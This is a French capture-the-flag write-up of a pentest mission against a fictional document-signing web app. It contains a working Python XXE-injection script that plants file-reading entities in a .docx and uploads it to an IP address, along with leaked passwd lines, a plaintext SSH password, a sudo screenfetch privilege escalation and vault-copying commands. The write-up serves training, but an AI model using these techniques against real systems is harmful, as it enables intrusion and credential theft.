---
title: Mission 4 - Pentest
weight: 1
---



# Mission 4 - Pentest

![DocTracker](../img/nullvastation-m4-doctracker.png)

Certainement la mission la plus compliquée de ce challenge.  notre organisation terroriste fictive a publié une application de gestion des documents compromis, celle-ci permet de : 
- Signer des documents .docx.
- Vérifier le propriétaire d'un document signé. 

## 1 - Reconaissance 

On commence par envoyer un .docx vide pour le signer. Puis on renvoie le document signé pour vérifier la signature. à ce moment un message d'affiche avec l'identifiant de la victime. 

Le message affichant l'identifiant de la victime, on peut supposer que l'identifiant est un champ vulnérable pour une injection. En décompressant le .docx on s'aperçoit que l'identifiant de la victime est stocké en dur dans le document.  une modification manuelle permet de confirmer cette hypothèse.
## 2 - Injection XXE  

Le champ injectable étant reflété dans l'application on vérifie s'il est possible d'utiliser une vulnérabilité XXE. Le site est bien faillible et on peut automatiser l'injection pour essayer de trouver des fichiers et dossiers intéressants.

```python
import os
import zipfile
import shutil
import uuid
import requests
from lxml import etree

# === CONFIG ===
UPLOAD_URL = "http://163.172.67.183/"
READ_URL = "http://163.172.67.183/read"
BASENAME = "evil"
BASE_DOCX = f"input/modified_unsigned.docx"
MODIFIED_DOCX = f"output/{BASENAME}_patched.docx"
TMP_DIR = f"tmp_dir"

# === FONCTIONS ===

def create_docx(path):
    """Crée un .docx minimal"""
    from docx import Document
    doc = Document()
    doc.add_paragraph("Hello Victim")
    doc.save(path)

def unzip_docx(docx_path, extract_dir):
    with zipfile.ZipFile(docx_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)

def rezip_docx(src_dir, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as docx:
        for foldername, _, filenames in os.walk(src_dir):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                arcname = os.path.relpath(file_path, src_dir)
                docx.write(file_path, arcname)

def corrupt_appxml(appxml_path, path_to_read):
    """Modifie la balise VictimID dans app.xml"""
    NEW_XML=f"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
    NEW_XML=NEW_XML+f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://{path_to_read.strip()}\"><!ENTITY safe \"<![CDATA[&xxe;]]\">]>"
    #NEW_XML=NEW_XML+"""<!ENTITY xxe SYSTEM "$(whoami)">"""
    NEW_XML=NEW_XML+"""<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><VictimID>&xxe;</VictimID></Properties>"""
    print(NEW_XML)
    with open(appxml_path, "w") as out :
        out.write(NEW_XML)

def send_docx_to_read(path):

    signed_files = {
        'file': (os.path.basename("signed_evil_temp_docx.docx"), open(path, 'rb'), 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')
    }

    r = requests.post(READ_URL, files=signed_files)
    print(r.text)
    return r.text if r.status_code==200 else f"HTTP {r.status_code}"


if __name__ == "__main__":


    with open("vuln.dict","r") as dic:

        for payload in dic.readlines() : 
            print(f"### TEST : { payload.strip()}")

            if not os.path.exists(BASE_DOCX):
                create_docx(BASE_DOCX)

            os.makedirs(TMP_DIR, exist_ok=True)
            unzip_docx(BASE_DOCX, TMP_DIR)

            appxml_path = os.path.join(TMP_DIR, "docProps", "app.xml")
            if not os.path.isfile(appxml_path):
                print("[-] ERREUR : docProps/app.xml introuvable.")
                exit(1)

            corrupt_appxml(appxml_path,payload)
            
            rezip_docx(TMP_DIR, MODIFIED_DOCX)

            msg = send_docx_to_read(MODIFIED_DOCX)  
            
```

En cherchant des informations on trouve plusieurs fichiers intéressants : 

### Récupération des utilisateurs 
```tpl
  document-user:x:999:996::/home/document-user:/bin/sh
  executor:x:996:995::/home/executor:/bin/bash
  administrator:x:995:994::/home/administrator:/bin/bash
```
### Bash History

On récupère un mot de passe dans l'historique de l'utilisateur courant : 

```bash
/home/document-user/.bash_history 

flask run --host=0.0.0.0 --port=5000
echo \"cABdTXRyUj5qgAEl0Zc0a\" >> /tmp/exec_ssh_password.tmp
ps aux | grep flask
cd templates/
```

### SSHD Config

Vérification du SSHD_CONFIG : Service ouvert sur 22222. Avec l'utilisateur et le mot de passe on se connecte et on obtient un shell sur la machine.x 

## 3 - Escalade de privilege 

Une fois connecté, il apparaît que l'utilisateur n'a pas un haut niveau de privlège, nous allons donc voir s'il est possible de pivoter vers un autre utilisateur. en vérifiant les privilèges sudo, on voit que la commande screenfetch est exécutable en tant qu'administrator. 

On tente une escalade de privilège vers l"utilisateur administrator : 

```bash
sudo -l 
screenfetch -s -S .. 
shell administrator 
```

## 4 - Exfiltration des données 

- Exfiltration du logo et du vault.kdbx :
dans /app/app.py (récupérable avec la première faille XXE), on observe que le programme écrit sur 
/dev/shm/uploads et /dev/shm/work. on peut y écrire avec executor.

‘‘‘
mkdir /dev/shm/mydir
cp /home/administrator/vault.kdbx /dev/shm/mydir
cp /home/administrator/logo.jpg /dev/shm/mydir
chmod 777 /dev/shm/mydir -R
‘‘‘

Le logo est bien evidemment la clé du coffre-fort où l'on trouve le drapeau.